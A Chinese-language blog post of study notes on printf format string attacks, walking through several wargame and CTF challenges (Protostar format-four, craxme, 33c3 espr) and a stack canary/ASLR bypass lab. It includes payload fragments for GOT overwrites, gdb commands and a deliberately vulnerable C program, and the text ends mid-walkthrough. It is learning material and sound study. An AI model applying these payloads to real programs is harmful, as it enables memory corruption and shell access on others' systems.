<!DOCTYPE html>
<html lang="en">

<!-- Head tag -->
<head>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!--Description-->
    
        <meta name="description" content="[2019/08/01]
原理一般我們寫 printf() 都是這樣寫 printf(&amp;quot;%d&amp;quot;, value)那如果寫成 printf(buf) 呢? 他會直接 leak function parameters 的內容，也就是 stack (x86) 或是 register (x64) 的內容這個就是 Format_string_attack 的源頭，如果程式設計師為了偷懶或其他原因把 printf 寫成這樣，而且我們又能控 buf 的值那就代表該程式受 Format_string_attack 影響，只要是 printf 家族的 function (ex. vprintf, sprintf) 都有這個問題舉個例子ㄅ上面這個我已經把 bp 下在 printf 了，然後是一支 x86 的程式可以看到我們直接給他 %p 他會吐給我 stack 內的值，照 calling convention 來說這就是在 leak function 的 parameters那既然他是 leak function parameters 的話，如果一直 leak 下去代表什麼?他會一直 leak 到 stack 的內容，所以 x64 的話她會依次 leak rsi rdx rcx r8 r9 的值再開始 leak stack 的值 (rdi 是 “%p%p%p” 本身所以不會 leak,又因為 bp 下 printf 的話會先 jmp 進去才停止，所以第一個位置會是 return address,這個不算在 function parameter 內，x86也是同理所以是 leak 第三個位置開始的值)
LiveOverflow這一個是看影片趕快做一下筆記，不然我快忘光了ＱＱ
影片：https://www.youtube.com/watch?v=t1LH9D5cuK4
題目：https://exploit.education/protostar/format-four/
先看一下source code:

可以看到他是直接做exit, 並沒有什麼return 0這種的">
    

    <!--Author-->
    
        <meta name="author" content="AStar">
    

    <!--Open Graph Title-->
    
        <meta property="og:title" content="Format_string_attack"/>
    

    <!--Open Graph Description-->
    

    <!--Open Graph Site Name-->
    <meta property="og:site_name" content="AStar&#39;s Blog"/>

    <!--Type page-->
    
        <meta property="og:type" content="article" />
    

    <!--Page Cover-->
    

        <meta name="twitter:card" content="summary" />
    

    <!-- Title -->
    
    <title>Format_string_attack - AStar&#39;s Blog</title>

    <!-- Bootstrap Core CSS -->
    <link href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" rel="stylesheet"/>

    <!-- Custom CSS -->
    
<link rel="stylesheet" href="/css/style.css">


    <!-- Custom Fonts -->
    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">
    <link href="//fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel="stylesheet" type="text/css">
    <link href="//fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css">

    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
    <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
    <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->

    <!-- Gallery -->
    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />

    <!-- Google Analytics -->
    


    <!-- favicon -->
    
	
<meta name="generator" content="Hexo 5.4.0"></head>


<body>

    <!-- Menu -->
    <!-- Navigation -->
<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
    <div class="container-fluid">
        <!-- Brand and toggle get grouped for better mobile display -->
        <div class="navbar-header page-scroll">
            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
                <span class="sr-only">Toggle navigation</span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
            </button>
            <a class="navbar-brand" href="/">AStar</a>
        </div>

        <!-- Collect the nav links, forms, and other content for toggling -->
        <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
            <ul class="nav navbar-nav navbar-right">
                
                    <li>
                        <a href="/">
                            
                                Home
                            
                        </a>
                    </li>
                
                    <li>
                        <a href="/archives">
                            
                                Archives
                            
                        </a>
                    </li>
                
                    <li>
                        <a href="/tags">
                            
                                Tags
                            
                        </a>
                    </li>
                
                    <li>
                        <a href="/categories">
                            
                                Categories
                            
                        </a>
                    </li>
                
                    <li>
                        <a target="_blank" rel="noopener" href="https://github.com/klugjo/hexo-theme-clean-blog">
                            
                                <i class="fa fa-github fa-stack-2x"></i>
                            
                        </a>
                    </li>
                
            </ul>
        </div>
        <!-- /.navbar-collapse -->
    </div>
    <!-- /.container -->
</nav>

    <!-- Main Content -->
    <!-- Page Header -->
<!-- Set your background image for this header in your post front-matter: cover -->

<header class="intro-header" style="background-image: url('https://i.imgur.com/mUijvOa.jpg')">
    <div class="container">
        <div class="row">
            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
                <div class="post-heading">
                    <h1>Format_string_attack</h1>
                    
                    <span class="meta">
                        <!-- Date and Author -->
                        
                        
                            2021-01-31
                        
                    </span>
                </div>
            </div>
        </div>
    </div>
</header>

<!-- Post Content -->
<article>
    <div class="container">
        <div class="row">

            <!-- Tags and categories -->
           

            <!-- Gallery -->
            

            <!-- Post Main Content -->
            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
                <p>[2019/08/01]</p>
<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>一般我們寫 <code>printf()</code> 都是這樣寫 <code>printf(&quot;%d&quot;, value)</code><br>那如果寫成 <code>printf(buf)</code> 呢? 他會直接 leak function parameters 的內容，也就是 stack (x86) 或是 register (x64) 的內容<br>這個就是 Format_string_attack 的源頭，如果程式設計師為了偷懶或其他原因把 printf 寫成這樣，而且我們又能控 <code>buf</code> 的值<br>那就代表該程式受 Format_string_attack 影響，只要是 <code>printf</code> 家族的 function (ex. vprintf, sprintf) 都有這個問題<br>舉個例子ㄅ<br><img src="/img/Format_string_attack/ori_1.png" alt=""><br>上面這個我已經把 bp 下在 printf 了，然後是一支 x86 的程式<br>可以看到我們直接給他 <code>%p</code> 他會吐給我 stack 內的值，照 calling convention 來說這就是在 leak function 的 parameters<br>那既然他是 leak function parameters 的話，如果一直 leak 下去代表什麼?<br>他會一直 leak 到 stack 的內容，所以 x64 的話她會依次 leak <code>rsi rdx rcx r8 r9</code> 的值再開始 leak stack 的值 (rdi 是 “%p%p%p” 本身所以不會 leak,又因為 bp 下 printf 的話會先 jmp 進去才停止，所以第一個位置會是 return address,這個不算在 function parameter 內，x86也是同理所以是 leak 第三個位置開始的值)</p>
<h1 id="LiveOverflow"><a href="#LiveOverflow" class="headerlink" title="LiveOverflow"></a>LiveOverflow</h1><p>這一個是看影片趕快做一下筆記，不然我快忘光了ＱＱ</p>
<p>影片：<a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=t1LH9D5cuK4">https://www.youtube.com/watch?v=t1LH9D5cuK4</a></p>
<p>題目：<a target="_blank" rel="noopener" href="https://exploit.education/protostar/format-four/">https://exploit.education/protostar/format-four/</a></p>
<p>先看一下source code:</p>
<p><img src="/img/Format_string_attack/liveformatstring1.png" alt=""></p>
<p>可以看到他是直接做<code>exit</code>, 並沒有什麼<code>return 0</code>這種的</p>
<p>所以overflow eip這點是不可行的</p>
<p>透過執行可以知道就是一個我們輸入什麼他printf什麼<br><img src="/img/Format_string_attack/liveformatstring_exec1.png" alt=""></p>
<p>但他的printf因為是直接使用<code>printf(buffer)</code>來做輸出<br>因此有format string的弱點，盲測的時候可以試著輸入看看<code>%x</code>或其他printf的關鍵字。<br>只要有像這樣的回應就代表有戲(?</p>
<p><img src="/img/Format_string_attack/liveformatstring_exec2.png" alt=""></p>
<p>一般來說Format string可以透過<code>aaaa%N$x</code>來找offset(x86)，N是任意數，就是透過<code>aaaa%1$x</code> <code>aaaa%2$x</code>…這樣子下去爆破取得offset<br><code>%N</code>是代表第N個參數，<code>$x</code>是以hex的方式輸出，參照<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Printf_format_string">wiki</a>和<a target="_blank" rel="noopener" href="https://www.owasp.org/index.php/Format_string_attack">owasp</a>:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">For example, printf(&quot;%2$d %2$#x; %1$d %1$#x&quot;,16,17) produces 17 0x11; 16 0x10.</span><br><span class="line"></span><br><span class="line">Below are some format parameters which can be used and their consequences:</span><br><span class="line"></span><br><span class="line">•&quot;%x&quot; Read data from the stack</span><br><span class="line"></span><br><span class="line">•&quot;%s&quot; Read character strings from the process&#x27; memory</span><br><span class="line"></span><br><span class="line">•&quot;%n&quot; Write an integer to locations in the process&#x27; memory</span><br><span class="line"></span><br><span class="line">%d - 輸出十進位整數</span><br><span class="line">%s - 從記憶體中讀取字串</span><br><span class="line">%x - 輸出十六進位整數</span><br><span class="line">%c - 字符 - 输出字符</span><br><span class="line">%p - 指针 - 指针地址</span><br><span class="line">%n - 寫入到目前为止所輸出的字符数</span><br></pre></td></tr></table></figure>
<p>但我懶，pwntool可以直接幫我們找到offset</p>
<p><img src="/img/Format_string_attack/liveformatstring2.png" alt=""></p>
<p><img src="/img/Format_string_attack/liveformatstring3.png" alt=""></p>
<p>可看見他的offset是7</p>
<p>知道了這些後，我們要做的就是把vuln裡面的exit的got address改指向hello的address</p>
<p>我們先用gdb改看看，首先先用objdump知道一些address的資訊</p>
<p><img src="/img/Format_string_attack/liveformatstring4.png" alt=""></p>
<p>這樣就知道了hello和vuln的exit@PLT address</p>
<p><img src="/img/Format_string_attack/liveformatstring5.png" alt=""></p>
<p>這樣就有了exit@GOT address了</p>
<p>我們把斷點下在<code>0x8049227</code>讓我們方便改exit@GOT的內容</p>
<pre><code>b *0x8049227
</code></pre><p>之後<code>r</code>它然後隨便輸入之後他會在斷點停下來<br>再對exit@GOT的內容進行更改</p>
<pre><code>set &#123;int&#125;0x804c01c=0x080491a2
</code></pre><p>然後再<code>c</code>它</p>
<p><img src="/img/Format_string_attack/liveformatstring6.png" alt=""></p>
<p>boo! 就會是我們要的結果了，接著我們要不透過gdb達到這件事情</p>
<p>剛剛知道了offset是7，那這個要怎麽利用呢？</p>
<p>我們先嘗試輸入<code>aaaa%7$x</code></p>
<p><img src="/img/Format_string_attack/liveformatstring7.png" alt=""></p>
<p>可以看到<code>0x61616161</code>就是我們剛剛輸入的hex</p>
<p>那我們輸入<code>0x8048000</code>看看呢？</p>
<p><img src="/img/Format_string_attack/liveformatstring8.png" alt=""></p>
<p><img src="/img/Format_string_attack/liveformatstring9.png" alt=""></p>
<p>可以看到他沒有回傳結果，因為<code>0x8048000</code>他會先輸出<code>00800408</code>才會去leak, <code>0x00</code>就是我們熟知的<code>EOF</code>，所以我們要換個方式來leak</p>
<p><img src="/img/Format_string_attack/liveformatstring10.png" alt=""></p>
<p>這樣子就會在leak出<code>0x8048000</code>位子的內容後才會輸出</p>
<p><img src="/img/Format_string_attack/liveformatstring11.png" alt=""></p>
<p>但因為相對位置改了，所以我們需要改一下我們的offset, 因為我們的<code>%7$s</code>是在不包含<code>%7$s</code>這個字串在內的offset</p>
<p>那現在把它放到前面再接address的話就會包含到<code>%7$s</code>這個字串了，所以我們要把offset+1就是這個道理 </p>
<p>這個在需要leak binary的時候算蠻重要的步驟，因為address不可能沒有<code>00</code></p>
<p>都準備好了之後我們要開始改寫exit@GOT的內容了，可以利用<code>%n</code>做到</p>
<p><img src="/img/Format_string_attack/liveformatstring14.png" alt=""></p>
<p>因為這個address沒有<code>00</code>的問題，所以我用<code>%7$n</code>這樣子還是可以的</p>
<p>如果要把address放後面的話就要改成</p>
<pre><code>&quot;aaaa&quot; + &quot;%9$n&quot; + p32(exit_GOT)
</code></pre><p>因為padding包含了”aaaa”和leak的payload, 所以offset要+2</p>
<p>讓我們用gdb trace一次看看</p>
<p><img src="/img/Format_string_attack/liveformatstring12.png" alt=""></p>
<p>看上面的exploit code可以知道我們在輸入前加了一個<code>gdb.attach()</code></p>
<p>這個是用來呼叫gdb hook的code<br>所以現在是輸入前的情況，我先看看exit@GOT的內容，現在的話還是正常的內容</p>
<p><img src="/img/Format_string_attack/liveformatstring13.png" alt=""></p>
<p>繼續讓它跑就crash了，這時候再看exit@GOT就會是0x8, 而eip也停在0x8, 因為PLT會把GOT的內容餵給eip, 這個0x8就是p32(exit_GOT)加上”aaaa”的長度</p>
<p>到這邊我們已經成功改寫exit@GOT<br>現在我們要借助<code>%n</code>把exit@GOT改寫成<code>0x80491a2</code><br>但要在寫入前先輸出<code>0x80481a2</code>個字串顯然是不太可行<br>(%n是把至今為止輸出的字串數量寫入特定address)</p>
<p>我們可以2個bytes 2個bytes寫入, 這樣一次的量就不會那麼多<br>我們首先先寫入後4 bytes比較容易(因為前面都補0就好)<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;hello&gt; = 0x080491a2</span><br><span class="line">0x91a2	= 37282</span><br></pre></td></tr></table></figure><br>但我們的<code>37282</code>還需要扣掉address本身佔的4 bytes<br>所以是<code>37278</code></p>
<p><img src="/img/Format_string_attack/liveformatstring15.png" alt=""></p>
<p>這是一個小技巧，你要輸出37278個a是的話可以<code>$x</code>前面加多少數字，他就會輸出多少個空格才輸出hex</p>
<p>我們用gdb trace看看</p>
<p><img src="/img/Format_string_attack/liveformatstring16.png" alt=""></p>
<p>這是輸入前的exit@GOT</p>
<p><img src="/img/Format_string_attack/liveformatstring17.png" alt=""></p>
<p>可以看到我們成功改寫後兩bytes了<br>那要怎麼改寫前兩bytes呢？因為<code>%n</code>的特性，我們只能越寫越大，但前兩個bytes我們要寫入<code>0x0804</code>怎麼辦呢？<br>影片中寫到是可以透過寫入<code>0x10804</code>來達到目的，因為GOT只會吃後兩bytes，我自己猜測寫超過的話有可能會影響到前一個<br>GOT的address，不過這也不影響我們的操作</p>
<p>實作還要再算一下，待我貼圖在慢慢說起</p>
<p><img src="/img/Format_string_attack/liveformatstring18.png" alt=""></p>
<p>第一個位址沒問題吧，然後我們把位址+2來寫高位的前兩個位址<br>這有點難說明，借影片的圖來說</p>
<p><img src="/img/Format_string_attack/liveformatstring19.png" alt=""></p>
<p>我們看過這麼多次的objdump可以知道，一個記憶體位置是存一個byte<br>所以GOT應該也是一個位址存一個bytes, 存了四個bytes,<br>以little endian的方式存</p>
<p>所以我們把address+2就會寫到前兩個位址的數值</p>
<p>再來就是算數學了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x10804=67588</span><br><span class="line">67588-37278-4-4=30302</span><br></pre></td></tr></table></figure>
<p>我們一樣執行用gdb去看</p>
<p><img src="/img/Format_string_attack/liveformatstring20.png" alt=""></p>
<p>這是執行printf前，還是正常的GOT內容</p>
<p><img src="/img/Format_string_attack/liveformatstring21.png" alt=""></p>
<p>可以看到成功被我們更改了</p>
<p><img src="/img/Format_string_attack/liveformatstring22.png" alt=""></p>
<h1 id="craxme"><a href="#craxme" class="headerlink" title="craxme"></a>craxme</h1><p>拿黑坑的例題來練習看看</p>
<p><img src="/img/Format_string_attack/hitconformat.png" alt=""></p>
<p>首先一樣我們要知道他的 offset 是多少</p>
<p><img src="/img/Format_string_attack/hitconformat_1.png" alt=""></p>
<p>然後看一下source code</p>
<p><img src="/img/Format_string_attack/hitconformat_2.png" alt=""></p>
<p>雖然這題是要你改寫 magic 的值來取得flag</p>
<p>但這一題可以取得 shell, 可以直接用一招拿到兩個flag</p>
<p>我們先看一下code</p>
<p><img src="/img/Format_string_attack/hitconformat_3.png" alt=""></p>
<p><img src="/img/Format_string_attack/hitconformat_4.png" alt=""></p>
<p>我們可以將<code>puts</code>的got更改成<code>0x080485a1</code>, 然後將<code>printf</code>的got改寫為<code>system</code>的PLT address</p>
<p>這樣我們只要在<code>read</code>輸入<code>/bin/sh</code>就會被構成 <code>system(&quot;/bin/sh&quot;)</code> 執行</p>
<p>這邊的寫法我研究過一陣子，因為一次寫兩個address, 數字真的不小，算起來燒腦</p>
<p>原本打算是在第二次<code>read</code>的時候再去蓋<code>printf</code>的GOT address (因為我們一定會跳到puts的那個選項，所以我們其實還可以再叫一次<code>read</code>)</p>
<p>但是發現透過puts跳過去的<code>read</code>的 offset 就不會是7了，等於要重找更麻煩，於是我還是認命的一次蓋兩個</p>
<p>跟上面教學如何蓋address一樣，只是它只蓋一個address, 蓋第二個address的話，就變成蓋後兩 bytes 的時候也要多蓋 1 byte 了, 那蓋前兩bytes呢？就變0x20804開頭了</p>
<p>不過我這裡碰到另一個雷點</p>
<p>就是好死不死我的 <code>puts@PLT</code> 下面就是 <code>system@PLT</code> </p>
<p><img src="/img/Format_string_attack/hitconformat_5.png" alt=""></p>
<p>所以造成一個慘劇發生——我在改寫 <code>puts@GOT</code> 的時候蓋到<code>system@GOT</code></p>
<p><img src="/img/Format_string_attack/hitconformat_6.png" alt=""></p>
<p>這時候怎麼辦呢？</p>
<p>在改寫 <code>puts@GOT</code> 的時候用<code>%hn</code>就好了</p>
<p>exploit code:</p>
<p><img src="/img/Format_string_attack/hitconformat_7.png" alt=""></p>
<pre><code>％hn 代表限制寫入的長度為2bytes
%hhn 代表寫入的長度限制為1bytes
</code></pre><p>許多format string attack 的 exploit code 很常看到這種寫法，有些為求精確寫入，會 1 byte 1 byte 的改寫</p>
<h1 id="espr"><a href="#espr" class="headerlink" title="espr"></a>espr</h1><p>影片：<a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=XuzuFUGuQv0">https://www.youtube.com/watch?v=XuzuFUGuQv0</a><br>題目：<a target="_blank" rel="noopener" href="https://github.com/InfoSecIITR/write-ups/tree/master/2016/33c3-ctf-2016/pwn/espr">https://github.com/InfoSecIITR/write-ups/tree/master/2016/33c3-ctf-2016/pwn/espr</a></p>
<p>這題是很有意思的 Format string attack 的題目，出題隊伍 ESPR 在 HITCON CTF 2017 當導覽員的時候就見過他們，德國一支蠻有名的隊伍，33c3 CTF的題目就是他們出的</p>
<p>這題就是把他們的隊名出成題目</p>
<p>題目只有一張圖片</p>
<p><img src="/img/Format_string_attack/espr_small.jpg" alt=""></p>
<p>為求真實，因此會在以沒拿到ELF的情況下解題</p>
<p>因為從題目看得到 <code>rsp</code> <code>rdi</code>，所以可以判定這題應該是x64的</p>
<p>用 pwntool 幫我算offset</p>
<p><img src="/img/Format_string_attack/esprformatstring_1.png" alt=""></p>
<p>我們要先嘗試它有沒有開PIE, 如果有開就傷腦筋了</p>
<p>如何確認呢？去嘗試他預設的檔頭位址就行了(<code>0x400000</code>)<br>先寫一個<code>leak.py</code></p>
<p><img src="/img/Format_string_attack/esprformatstring_2.png" alt=""></p>
<p>注意前面的padding要補滿8個，我就因為沒補8個一時之間還以為是 offset 算錯</p>
<p><img src="/img/Format_string_attack/esprformatstring_3.png" alt=""></p>
<p>看起來是沒開 PIE 的，這樣就可以準備來leak binary</p>
<p><img src="/img/Format_string_attack/esprformatstring_4.png" alt=""></p>
<p>這邊也要注意一些 exception 的處理</p>
<p>在try那邊我們有針對 <code>EOFError</code> <code>(null)</code> 做例外處理</p>
<p>雖然<code>dump.raw</code>無法執行，但以 leak binary 的角度來說夠了</p>
<p><img src="/img/Format_string_attack/esprformatstring_5.png" alt=""></p>
<p>我們可以用 radare2 更改 function name </p>
<p><img src="/img/Format_string_attack/esprformatstring_6.png" alt=""></p>
<p>整理完後大概是這個樣子：</p>
<p><img src="/img/Format_string_attack/esprformatstring_7.png" alt=""></p>
<p>然後可以進去各個 PLT address 得知這些function的 GOT address</p>
<p>把它加進 exploit code</p>
<p><img src="/img/Format_string_attack/esprformatstring_8.png" alt=""></p>
<p>我們就可以透過 GOT address 去 leak 他的 libc address</p>
<p>但過程中我碰到一個小bug</p>
<p>就是當我用 <code>u64</code> 想把我 recv 回來的 address unpack 的時候一樣跳 error 說長度錯誤</p>
<p>因此我用下面的code 進行 debug</p>
<p><img src="/img/Format_string_attack/esprformatstring_9.png" alt=""></p>
<p>結果是…</p>
<p><img src="/img/Format_string_attack/esprformatstring_10.png" alt=""></p>
<p>WTF !? 長度9?</p>
<p>而且raw還出現我沒recv的東西，順便說一下repr很好用，一些無法顯示在 shell 的 ascii 他會幫你轉成字串輸出</p>
<p>好消息是看起來就是固定會出現那些例外的data, 所以我recv那邊做一下調整就可以了</p>
<p><img src="/img/Format_string_attack/esprformatstring_11.png" alt=""></p>
<p><img src="/img/Format_string_attack/esprformatstring_12.png" alt=""></p>
<p>到這裡我們成功得到它 libc 的 address 了<br>我們可以用相同的方法把 <code>sleep</code> 和 <code>gets</code> 的 libc 都 leak 出來<br>但我們如果沒有它的 libc 版本還是不知道 system address 怎麼得到啊<br>這邊我們可以用 <code>libc_database</code> 知道他是哪個版本的libc, 但這邊我們是local端<br>就不做了直接leak libc</p>
<p><img src="/img/Format_string_attack/esprformatstring_13.png" alt=""></p>
<p>現在我們有了一切，但最重要的 overwrite 該怎麼做呢？</p>
<p>要知道雖然是 ASLR, 但各 function 之間的距離沒有變，我們可以藉由我們leak出的address得知 <code>printf</code> 和 <code>system</code> 的間距是 <code>0x13ba0</code> (這個資訊後來覺得其實沒啥用XD)</p>
<p>雖然x64無法讓我們改寫8 bytes的所有內容，但我們也不需要，只需要改寫最後3bytes就夠了</p>
<p>假設system 的位址是 <code>0x7fa1b127a9c0</code><br>我們把 <code>0x7fa1b127a9c0</code> 跟 <code>0xff</code> 做 <code>and</code> 運算<br>這樣我們就可以取得最後 1 byte <code>0xc0</code><br>同理 <code>0x7fa1b127a9c0 &amp; 0xffff00</code> 可以得到 <code>0x27a900</code><br>但我們要寫入的應該是 <code>0x27a9</code> 而不是 <code>0x27a900</code><br>所以我們還需要把 <code>0x27a900 &gt;&gt; 8</code>  來得到 <code>0x27a9</code></p>
<p><code>&gt;&gt; 8</code> 的意思是把數值以二進位形式往右移8位，16進位的話一個數字會由4個0和1組成，要往右移兩個數字的話當然就是移8位了</p>
<p>詳細的介紹可以參考 <a href="&quot;http://www.runoob.com/python/python-operators.html&quot;">這裏</a></p>
<p>我們要做的就是把 <code>printf@GOT</code> 改寫成 <code>system</code> 然後再輸入 <code>/bin/sh</code> 就可以拿到 shell 了</p>
<p>不過要注意一點，與x86不同的是x64一定會遇到 null byte 的問題，剛剛複習了上面的寫法後，因為x64的address不會填滿 8 byte 所以會遇到<code>0x00</code>導致蓋失敗的問題</p>
<p><img src="/img/Format_string_attack/esprformatstring_14.png" alt=""></p>
<p>所以要更改寫法，把 <code>printf@GOT</code>放到最後改寫，變成我前面的寫入位址的 payload 都要蓋滿 8 bytes (神麻煩)</p>
<p>我一樣先嘗試改寫最後 1 byte…. 真的很燒腦</p>
<pre><code>payload = &quot;%&quot;+str(196)&quot;c&quot; + &quot;%8$hhn&quot;+ &quot;%8$sa&quot; + p64(printf_GOT)
</code></pre><p><img src="/img/Format_string_attack/esprformatstring_15.png" alt=""></p>
<p>最後看 write up 發現可以用 ljust 讓 leak 的 padding 固定，就不用在那邊算 offset 多少了</p>
<p><img src="/img/Format_string_attack/esprformatstring_16.png" alt=""></p>
<p>那個 <code>time.sleep(1)</code> 是怕說他還在 sleep 我們就 sendline 了，但其實好像不加也可以（？</p>
<p><img src="/img/Format_string_attack/esprformatstring_17.jpg" alt=""></p>
<p>真….真的累，光 overwrite 就研究了一整天，網路上的 payload 好難懂</p>
<h1 id="Bypass-Stack-canary-amp-NX-amp-ASLR"><a href="#Bypass-Stack-canary-amp-NX-amp-ASLR" class="headerlink" title="Bypass Stack canary &amp; NX &amp; ASLR"></a>Bypass Stack canary &amp; NX &amp; ASLR</h1><p>一直想研究這個很久了，每次都只有口頭聽說 Format string attack 可以 byapss linux 那四個防禦機制，但都沒親身實測過</p>
<p>網路上的資源也很少在說 bypass stack canary, 終於找到<a href="&quot;https://www.ret2rop.com/2018/08/format-string-defeating-stack-canary-nx-aslr-remote.html&quot;">這篇</a></p>
<p>大概介紹一下 stack canary, 這個是 linux 為了防止buffer overflow所做的保護機制<br>他會在<del> rbp 與 return address 之間插入一個隨機值</del> rbp 之前插入一個隨機值<br>只要有人嘗試透過 buffer overflow 修改到這個隨機值，程式就會終止達到保護的目的</p>
<p>我不清楚是不是每個linux都這樣，但我自己 trace 的結果是這樣，順便嘴一下誤導我的文章<br><a target="_blank" rel="noopener" href="https://access.redhat.com/blogs/766093/posts/3548631">https://access.redhat.com/blogs/766093/posts/3548631</a></p>
<p>圖畫錯啦！</p>
<p>source code:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">void center(void)</span><br><span class="line">&#123;</span><br><span class="line">  char code[128];</span><br><span class="line">  printf(&quot;Enter secret code !\nCode: &quot;);</span><br><span class="line">  gets(code);           //take input</span><br><span class="line">  printf(&quot;Entered Command center with code &gt; %s .\n&quot;,code);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    char name[64];</span><br><span class="line">    setvbuf(stdin, 0, 2, 0);        //no buffering in stdin and stdout</span><br><span class="line">    setvbuf(stdout, 0, 2, 0);</span><br><span class="line">    memset(name, 0, sizeof(name));      //fill name buffer with null bytes</span><br><span class="line">    printf(&quot;What is your name?\nName: &quot;);</span><br><span class="line">    read(0, name, 64);          //read 64 bytes from stdin(0) to name</span><br><span class="line">    printf(&quot;Hello &quot;); printf(name);</span><br><span class="line">    center();               //call center function</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>以往都是貼圖片，用這樣子好像比較好一點</p>
<p>反正跑起來就是這樣</p>
<p><img src="/img/Format_string_attack/bypass_formatstring_1.png" alt=""></p>
<p>看看他的保護機制</p>
<p><img src="/img/Format_string_attack/bypass_formatstring_2.png" alt=""></p>
<p>我們用gdb debug 他看看，首先我們是進入 <code>center</code> 這個 function 進行 overflow 的，所以要先想辦法 leak <code>center</code> 的stack canary的值</p>
<p><img src="/img/Format_string_attack/bypass_formatstring_3.png" alt=""></p>
<p>可以看到其中的 <code>fs:0x28</code> 就是 <code>fs</code> 這個 segment register + 0x28 的記憶體位置得到的 random value</p>
<p><code>fs</code> base address 我們無從得知</p>
<p>我們把斷點下在 <code>center+95</code> 看看 stack canary 的值</p>
<p><img src="/img/Format_string_attack/bypass_formatstring_4.png" alt=""></p>
<p>可以看到 rax 就是 stack canary 的值,這個值與 <code>fs:0x28</code> 是相等的，如果 xor 的結果不為0就代表有 overflow 發生，程式就會 terminated</p>
<p>這邊開始我們來 leak stack canary 的值，因為不是找 leak address 的 offset, 所以 pwntools 幫不了我們</p>
<p>只能手動找 offset, 可以利用 <code>%lx</code> 來找 offset, 一般 leak 只能 leak 4byte, 加一個 <code>l</code> 就是 <code>long</code> 的意思</p>
<p>我們一樣用 gdb 配合我們下斷點</p>
<p><img src="/img/Format_string_attack/bypass_formatstring_5.png" alt=""></p>
<p><img src="/img/Format_string_attack/bypass_formatstring_6.png" alt=""></p>
<p>因為第一個 <code>Name</code> 的輸入有做長度限制，所以可以不用怕蓋到 stack canary 的值放多一點</p>
<p>可以看到我們大概在第15個 <code>%lx|</code> 就可以 leak stack canary</p>
<p>但能 leak stack canary 只能確保我們能進行 overflow 而已</p>
<p>重點是能跳到哪呢？</p>
<p>我們除了能 leak stack canary 以外，還能 leak <code>r8</code> 的值</p>
<p>根據上面參考的連結說 <code>r8</code> 的地址和 libc base 有固定的公差</p>
<p>libc base 可以透過 <code>vmmap</code> 得到</p>
<p><img src="/img/Format_string_attack/bypass_formatstring_7.png" alt=""></p>
<p><code>0x00007ffff7fc2500 - 0x00007ffff7e00000 = 1844480</code></p>
<p>這邊上面的教學寫錯了，他直接拿 <code>r-x</code> 的區段當 libc base</p>
<p>這應該要從 libc 的頭來當 base, 畢竟所有的 offset 都是以 libc 的開頭來算的<br>（ 不然就是他的 libc 特別厲害都沒在切區段的全都可執行 ）</p>
<p>稍微整理一下payload之後就是這個樣子</p>
<p><img src="/img/Format_string_attack/bypass_formatstring_11.png" alt=""></p>
<p><img src="/img/Format_string_attack/bypass_formatstring_11_1.png" alt=""></p>
<p>這樣就得到 libc base address 和 canary 的值了，再來雖然我們前面說可以進行 overflow</p>
<p>但具體上的offset是多少呢？</p>
<p>不能直接用 <code>cyclic</code> 盲蓋，這樣蓋到 stack canary 會直接 crash</p>
<p>因為我們有 ELF 所以直接用 gdb 可以數得出來</p>
<p><img src="/img/Format_string_attack/bypass_formatstring_8.png" alt=""></p>
<p><img src="/img/Format_string_attack/bypass_formatstring_9.png" alt=""></p>
<p>在<code>0x62</code>到 canary 之間的空間就是 buffer 的空間(136)</p>
